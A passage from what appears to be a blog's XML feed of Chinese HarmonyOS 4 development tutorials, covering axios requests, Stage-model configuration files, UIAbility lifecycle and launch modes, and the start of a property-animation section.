class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在模块的module.json5文件中配置网络权限</span></span><br><span class="line"><span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">  <span class="attr">&quot;requestPermissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  </span><br><span class="line">    <span class="punctuation">&#123;</span>  </span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ohos.permission.INTERNET&quot;</span>  </span><br><span class="line">    <span class="punctuation">&#125;</span>  </span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="使用axios"><a href="#使用axios" class="headerlink" title="使用axios"></a>使用axios</h2><ol><li>导入axios<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;@ohos/axios&#x27;</span></span><br></pre></td></tr></table></figure></li><li>发送请求并处理响应<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(  <span class="comment">//请求方式，不同方式使用不同方法</span></span><br><span class="line"><span class="string">&#x27;url&#x27;</span>，  <span class="comment">//请求路径</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">params</span>: &#123;<span class="string">&#x27;param1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>&#125;, <span class="comment">//请求选项</span></span><br><span class="line"><span class="attr">data</span>: &#123;<span class="string">&#x27;param1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>&#125;</span><br><span class="line"><span class="comment">//请求可选项非常多，可以参考官方文档</span></span><br><span class="line"><span class="comment">//params是GET请求时的参数，会被放在url后面，data是POST或者PUT等等的请求参数</span></span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123; <span class="comment">//响应结果，AxiosResponse</span></span><br><span class="line"><span class="keyword">if</span>(response.<span class="property">status</span> !== <span class="number">200</span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;查询失败&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;查询成功&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;查询失败&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><table><thead><tr><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>status</td><td>number</td><td>响应状态码</td></tr><tr><td>headers</td><td>Object</td><td>响应头</td></tr><tr><td>data</td><td>any</td><td>服务端返回的响应体</td></tr></tbody></table><ul><li>这里的data不同于http需要把JSON格式转换，这里可以直接使用</li><li>下面是实例</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114162031.png" alt="image.png"></p><ul><li>无需创建请求对象</li></ul>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkUI </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-Stage模型</title>
      <link href="/2024/01/13/%E9%B8%BF%E8%92%99HarmonyOS%204-Stage%E6%A8%A1%E5%9E%8B/"/>
      <url>/2024/01/13/%E9%B8%BF%E8%92%99HarmonyOS%204-Stage%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Stage模型概述"><a href="#Stage模型概述" class="headerlink" title="Stage模型概述"></a>Stage模型概述</h1><ul><li>详细内容可以看一下<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/application-model-composition-0000001544384013-V3">鸿蒙开发者文档</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240113133302.png" alt="image.png"></li><li>模块是应用的基本功能单元，包含源代码、资源以及配置文件等内容</li><li>模块分为两大类，像entry这样的模块称为Ability Module能力模块，而通用的资源等可以放在一个模块当中，这样的模块成为Library Module，Ability Module就可以去引用Library的模块了。</li><li>整个源码会被编译打包成APP，为了降低不同功能模块之间的耦合，每一个模块都是可以独立编译和运行的，所有的Ability Module会被编译成HAP文件，而Library Module会被编译成HSP文件。</li><li>一个应用有且只有一个Entry类型的HAP文件，而Feature类型可以有多个。</li><li>所有HAP文件最后会打包成Bundle文件，最后一起打包成安装包文件。Bundle name是整个应用的唯一标识。</li><li>HAP在运行时会创建一个名为Ability Stage的实例，理解为应用组件的“舞台”。</li><li>因为Ability和窗口的分割，可以实现对不同设备窗口的单独裁切适配。</li></ul><h1 id="应用配置文件"><a href="#应用配置文件" class="headerlink" title="应用配置文件"></a>应用配置文件</h1><ul><li>鸿蒙应用的配置文件有两类：</li><li>第一类值针对这个应用的全局配置文件，在<code>AppScope/app.json5</code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.json5全局配置文件</span></span><br><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">  <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;bundleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.example.myapplication&quot;</span><span class="punctuation">,</span>  <span class="comment">//是应用的唯一标识，不与其他应用重复，使用域名倒置的方式命名</span></span><br><span class="line">    <span class="attr">&quot;vendor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;versionCode&quot;</span><span class="punctuation">:</span> <span class="number">1000000</span><span class="punctuation">,</span>  <span class="comment">//数字型的版本号</span></span><br><span class="line">    <span class="attr">&quot;versionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span>  <span class="comment">//字符型的版本号</span></span><br><span class="line">    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$media:app_icon&quot;</span><span class="punctuation">,</span>  <span class="comment">//应用图标</span></span><br><span class="line">    <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$string:app_name&quot;</span>  <span class="comment">//应用描述</span></span><br><span class="line">  <span class="punctuation">&#125;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li>第二类是在每个模块里，在每个模块的<code>src/main/module.json5</code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//module.json5模块配置文件</span></span><br><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">  <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;requestPermissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  <span class="comment">//系统权限申请</span></span><br><span class="line">      <span class="punctuation">&#123;</span>  </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ohos.permission.INTERNET&quot;</span>  </span><br><span class="line">      <span class="punctuation">&#125;</span>  </span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;entry&quot;</span><span class="punctuation">,</span>  <span class="comment">//模块名称</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;entry&quot;</span><span class="punctuation">,</span>  <span class="comment">//模块类型，entry入口型、feature功能型、shared共享型</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$string:module_desc&quot;</span><span class="punctuation">,</span>  <span class="comment">//当前模块的描述，读取的是base/element/string.json</span></span><br><span class="line">    <span class="attr">&quot;mainElement&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EntryAbility&quot;</span><span class="punctuation">,</span>  <span class="comment">//入口ability</span></span><br><span class="line">    <span class="attr">&quot;deviceTypes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  <span class="comment">//设备类型</span></span><br><span class="line">      <span class="string">&quot;phone&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">      <span class="string">&quot;tablet&quot;</span>  </span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;deliveryWithInstall&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">//跟随APP安装，Entry类型必须安装，feature可选</span></span><br><span class="line">    <span class="attr">&quot;installationFree&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$profile:main_pages&quot;</span><span class="punctuation">,</span>  <span class="comment">//模块中的所有页面，读取的是base/profile/main_pages.json</span></span><br><span class="line">    <span class="attr">&quot;abilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  <span class="comment">//可以有多个ability，以数组的形式写出</span></span><br><span class="line">      <span class="punctuation">&#123;</span>  </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EntryAbility&quot;</span><span class="punctuation">,</span>  <span class="comment">//ability的名称</span></span><br><span class="line">        <span class="attr">&quot;srcEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./ets/entryability/EntryAbility.ts&quot;</span><span class="punctuation">,</span>  <span class="comment">//ability的源码位置</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$string:EntryAbility_desc&quot;</span><span class="punctuation">,</span>  <span class="comment">//ability的描述</span></span><br><span class="line">        <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$media:icon&quot;</span><span class="punctuation">,</span>  <span class="comment">//ability的图标</span></span><br><span class="line">        <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$string:EntryAbility_label&quot;</span><span class="punctuation">,</span>  <span class="comment">//当前ability的文字描述</span></span><br><span class="line">        <span class="comment">//由于这是入口ability，所以图标和文字描述也就是桌面显示的</span></span><br><span class="line">        <span class="attr">&quot;startWindowIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$media:icon&quot;</span><span class="punctuation">,</span>  <span class="comment">//应用启动时的图标</span></span><br><span class="line">        <span class="attr">&quot;startWindowBackground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$color:start_window_background&quot;</span><span class="punctuation">,</span>  <span class="comment">//应用启动时的图标背景色</span></span><br><span class="line">        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;skills&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  <span class="comment">//功能的声明</span></span><br><span class="line">          <span class="punctuation">&#123;</span>  </span><br><span class="line">            <span class="attr">&quot;entities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  </span><br><span class="line">              <span class="string">&quot;entity.system.home&quot;</span>  </span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span>  </span><br><span class="line">            <span class="attr">&quot;actions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  </span><br><span class="line">              <span class="string">&quot;action.system.home&quot;</span>  </span><br><span class="line">            <span class="punctuation">]</span>  </span><br><span class="line">          <span class="punctuation">&#125;</span>  </span><br><span class="line">        <span class="punctuation">]</span>  </span><br><span class="line">      <span class="punctuation">&#125;</span>  </span><br><span class="line">    <span class="punctuation">]</span>  </span><br><span class="line">  <span class="punctuation">&#125;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="UIAbility生命周期"><a href="#UIAbility生命周期" class="headerlink" title="UIAbility生命周期"></a>UIAbility生命周期</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240113144314.png" alt="image.png"></p><ul><li>以微信为例，进入微信会自动创建（Create）一个UIAbility，因为是入口所有会自动设置为前台（Foreground）。</li><li>当打开小程序或者视频号等独立功能时，会再次创建（Create）一个UIAbility，同时原本的UIAbility会被设置为后台（Background）。查看手机后台可以看到两个微信。</li><li>当不使用的时候可以直接去除后台（Destroy）。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/main/ets/entryability/EntryAbility.ts</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">UIAbility</span> <span class="keyword">from</span> <span class="string">&#x27;@ohos.app.ability.UIAbility&#x27;</span>;  </span><br><span class="line"><span class="keyword">import</span> hilog <span class="keyword">from</span> <span class="string">&#x27;@ohos.hilog&#x27;</span>;  </span><br><span class="line"><span class="keyword">import</span> <span class="variable language_">window</span> <span class="keyword">from</span> <span class="string">&#x27;@ohos.window&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">EntryAbility</span> <span class="keyword">extends</span> <span class="title class_ inherited__">UIAbility</span> &#123;  <span class="comment">//继承了UIAbility</span></span><br><span class="line">  <span class="title function_">onCreate</span>(<span class="params">want, launchParam</span>) &#123;  <span class="comment">//当被创建时</span></span><br><span class="line">    hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;%&#123;public&#125;s&#x27;</span>, <span class="string">&#x27;Ability onCreate&#x27;</span>);  <span class="comment">//hilog是日志</span></span><br><span class="line">    <span class="comment">//info是日志级别，还有debug、error等等</span></span><br><span class="line">    <span class="comment">//0x0000是用来标识的参数，&#x27;testTag&#x27;是文字标记，&#x27;%&#123;public&#125;s&#x27;占位符，public为公开，最后是日志内容</span></span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="title function_">onDestroy</span>(<span class="params"></span>) &#123;  <span class="comment">//当被销毁时</span></span><br><span class="line">    hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;%&#123;public&#125;s&#x27;</span>, <span class="string">&#x27;Ability onDestroy&#x27;</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="title function_">onWindowStageCreate</span>(<span class="params">windowStage: <span class="variable language_">window</span>.WindowStage</span>) &#123;  <span class="comment">//当WindowStage被创建时</span></span><br><span class="line">    <span class="comment">// Main window is created, set main page for this ability  </span></span><br><span class="line">    hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;%&#123;public&#125;s&#x27;</span>, <span class="string">&#x27;Ability onWindowStageCreate&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    windowStage.<span class="title function_">loadContent</span>(<span class="string">&#x27;pages/Index&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;  <span class="comment">//打开首页</span></span><br><span class="line">      <span class="keyword">if</span> (err.<span class="property">code</span>) &#123;  </span><br><span class="line">        hilog.<span class="title function_">error</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;Failed to load the content. Cause: %&#123;public&#125;s&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(err) ?? <span class="string">&#x27;&#x27;</span>);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">      &#125;  </span><br><span class="line">      hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;Succeeded in loading the content. Data: %&#123;public&#125;s&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data) ?? <span class="string">&#x27;&#x27;</span>);  </span><br><span class="line">    &#125;);  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="title function_">onWindowStageDestroy</span>(<span class="params"></span>) &#123;  <span class="comment">//当WindowStage被销毁时</span></span><br><span class="line">    <span class="comment">// Main window is destroyed, release UI related resources  </span></span><br><span class="line">    hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;%&#123;public&#125;s&#x27;</span>, <span class="string">&#x27;Ability onWindowStageDestroy&#x27;</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="title function_">onForeground</span>(<span class="params"></span>) &#123;  <span class="comment">//在前台时</span></span><br><span class="line">    <span class="comment">// Ability has brought to foreground  </span></span><br><span class="line">    hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;%&#123;public&#125;s&#x27;</span>, <span class="string">&#x27;Ability onForeground&#x27;</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="title function_">onBackground</span>(<span class="params"></span>) &#123;  <span class="comment">//在后台时</span></span><br><span class="line">    <span class="comment">// Ability has back to background  </span></span><br><span class="line">    hilog.<span class="title function_">info</span>(<span class="number">0x0000</span>, <span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;%&#123;public&#125;s&#x27;</span>, <span class="string">&#x27;Ability onBackground&#x27;</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240113150458.png" alt="image.png"></li></ul><h1 id="页面及组件生命周期"><a href="#页面及组件生命周期" class="headerlink" title="页面及组件生命周期"></a>页面及组件生命周期</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240113152337.png" alt="image.png"></p><ul><li>aboutToAppear函数是在组件被创建之后build创建之前触发，可以在这里做一些初始化和数据的准备工作。</li><li>onPageShow函数是当页面被展示的时候会执行，onPageHide函数是当页面被隐藏的时候会执行，onBackPress函数是点击返回的时候触发。三个一起为页面生命周期函数，可以做一些功能性的逻辑。</li><li>aboutToDisappear函数是组件被销毁时触发。可以在这里做一些数据保存等。</li><li>用push方法跳转页面，并不会销毁组件，而是隐藏，但是replace方法会销毁组件，性能消耗大。</li><li>子组件不会执行页面生命周期函数。</li><li>For循环刷新渲染会将每个元素都删除重新渲染，需要给每个元素添加标识才可以避免反复渲染。</li></ul><h1 id="UIAbility的启动模式"><a href="#UIAbility的启动模式" class="headerlink" title="UIAbility的启动模式"></a>UIAbility的启动模式</h1><h2 id="Singleton启动模式"><a href="#Singleton启动模式" class="headerlink" title="Singleton启动模式"></a>Singleton启动模式</h2><ul><li>每一个UIAbility只存在唯一实例。是<strong>默认启动模式</strong>。</li><li>任务列表中只会存在一个相同的UIAbility<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240113161405.png" alt="image.png"></li><li>再次打开UIAbility只是将之前被隐藏的重新显示</li></ul><h2 id="standard启动模式"><a href="#standard启动模式" class="headerlink" title="standard启动模式"></a>standard启动模式</h2><ul><li>每次启动UIAbility<strong>都会创建一个新的实例</strong>。</li><li>在任务列表中可能存在一个或多个相同的UIAbility<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240113161750.png" alt="image.png"><blockquote><p><strong>multiton启动模式</strong><br>和standard类似，但是每次启动UIAbility都会创建一个新的实例，而旧的会<strong>被销毁</strong></p></blockquote></li></ul><h2 id="specified启动模式"><a href="#specified启动模式" class="headerlink" title="specified启动模式"></a>specified启动模式</h2><ul><li>每个UIAbility实例可以设置Key标示</li><li>启动UIAbility时，需要指定Key，存在Key相同实例直接被拉起，不存在则创建新实例</li><li>在实际应用中，可以在需要多个内容同时使用的情况下使用，例如文档编辑需要打开两个文档，并保留在后台<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 当前UIAbility调用startAbility方法拉起目标UIAbility</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.1 获取上下文</span></span><br><span class="line">context = <span class="title function_">getContext</span>(<span class="variable language_">this</span>) <span class="keyword">as</span> common.<span class="property">UIAbilityContext</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2 指定要跳转的UIAbility的信息</span></span><br><span class="line"><span class="keyword">let</span> want = &#123;</span><br><span class="line"><span class="attr">deviceID</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">//deviceId为空表示本设备</span></span><br><span class="line"><span class="attr">bundleName</span>: <span class="string">&#x27;com.example.myapplication&#x27;</span>, <span class="comment">//指定哪个应用的bundleName</span></span><br><span class="line"><span class="attr">abiliyuName</span>: <span class="string">&#x27;DocumentAbility&#x27;</span>,</span><br><span class="line"><span class="attr">moduleName</span>: <span class="string">&#x27;entry&#x27;</span>, <span class="comment">//moduleName非必选</span></span><br><span class="line"><span class="attr">parameters</span>: &#123;</span><br><span class="line"><span class="comment">// getInstanceKey：自定义方法，生成目标UIAbility实例的Key</span></span><br><span class="line"><span class="attr">instanceKey</span>: <span class="variable language_">this</span>.<span class="title function_">getInstanceKey</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3 尝试拉起目标UIAbility实例</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">context</span>.<span class="title function_">startAbility</span>(want)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 在AbilityStage的生命周期回调中为目标UIAbility实例生成Key</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">MyAbilityStage</span> <span class="keyword">extends</span> <span class="title class_ inherited__">AbilityState</span>&#123;</span><br><span class="line"><span class="title function_">onAcceptWant</span>(<span class="attr">want</span>: <span class="title class_">Want</span>): <span class="built_in">string</span> &#123;</span><br><span class="line"><span class="comment">//判断当前要拉取的是否是DocumentAbility</span></span><br><span class="line"><span class="keyword">if</span>(want.<span class="property">abilityName</span> === <span class="string">&#x27;DocumentAbility&#x27;</span>)&#123;</span><br><span class="line"><span class="comment">//根据参数中的instanceKey参数拼接生成一个Key值并返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">`DocAbility_<span class="subst">$&#123;want.parameters.instanceKey&#125;</span>`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 在module.json5配置文件中，通过srcEntry参数指定AbilityStage路径</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;module&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;entry&quot;</span>,</span><br><span class="line"><span class="string">&quot;type&quot;</span>: <span class="string">&quot;entry&quot;</span>,</span><br><span class="line"><span class="string">&quot;srcEntry&quot;</span>: <span class="string">&quot;./ets/myabilitystage/MyAbilityStage.ts&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>详细可以参考<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/uiability-launch-type-0000001428061476-V3">鸿蒙开发文档</a>，因为太复杂了。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkUI </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-动画</title>
      <link href="/2024/01/12/%E9%B8%BF%E8%92%99HarmonyOS%204-%E5%8A%A8%E7%94%BB/"/>
      <url>/2024/01/12/%E9%B8%BF%E8%92%99HarmonyOS%204-%E5%8A%A8%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="属性动画"><a href="#属性动画" class="headerlink" title="属性动画"></a>属性动画</h1><ul><li><strong>属性动画</strong>是通过设置组件的<code>animation</code>属性来给组件添加动画，当组件的<code>width</code>、<code>height</code>、<code>Opacity</code>、<code>backgroundColor</code>、<code>scale</code>、<code>rotate</code>、<code>translate</code>等属性变更时，可以实现渐变过度效果。</li></ul><table><thead><tr><th>名称</th><th>参数类型</th><th>必填</th><th>描述</th></tr></thead><tbody><tr><td>duration</td><td>number</td><td>否</td><td>设置动画时长<br>默认值：1000，单位：毫秒</td></tr><tr><td>tempo</td><td>number</td><td>否</td><td>动画播放速度。数值越大，速度越快。<br>默认值：1</td></tr><tr><td>curve</td><td>string | Curve</td><td>否</td><td>设置动画曲线。<br>默认值：Curve.EaselnOut，平滑开始和结束</td></tr><tr><td>delay</td><td>number</td><td>否</td><td>设置动画延迟执行的时长<br>默认值：0，单位:毫秒</td></tr><tr><td>iterations</td><td>number</td><td>否</td><td>设置播放次数。<br>默认值：1，取值范围：[-1,+o)<br>说明：设置为-1时表示无限次播放。</td></tr><tr><td>playMode</td><td>PlayMode</td><td>否</td><td>设置动画播放模式，默认播放完成后重头开始播放<br>默认值：PlavMode.Normal</td></tr><tr><td>onFinish</td><td>()&#x3D;&gt; void</td><td>否</td><td>状态回调，动画播放完成时触发。</td></tr></tbody></table><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 